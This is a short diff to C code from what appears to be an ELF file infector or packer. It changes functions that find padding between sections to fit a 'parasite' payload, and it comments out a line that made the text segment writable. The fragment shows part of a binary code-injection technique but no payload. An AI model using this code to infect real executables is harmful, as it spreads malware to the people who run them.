@@ -13,9 +13,9 @@ off_t		PaddingFinder_shdr_64(void *ptr)
 	{
 		previous = shdr[i - 1].sh_offset + shdr[i - 1].sh_size;
 		current = shdr[i].sh_offset;
-		if (!previous|| previous > current)
+		if (!previous || previous > current)
 			continue;
-		if ((current - previous) > strlen(message))
+		if ((current - previous) > parasite_full_size)
 			return (previous);
 	}
 	return (0);
@@ -47,7 +47,7 @@ off_t		PaddingSizeFinder_64_v2(void *ptr)
 			phdr[i].p_memsz  = phdr[i].p_memsz  + parasite_full_size;
 
 			// Make text segment writable
-			phdr[i].p_flags = PF_R | PF_W | PF_X;
+			// phdr[i].p_flags = PF_R | PF_W | PF_X;
 		}
 		// Find next segment after .text Segment and calculate padding size
 		else if (TEXT_SEGMENT_FOUND)
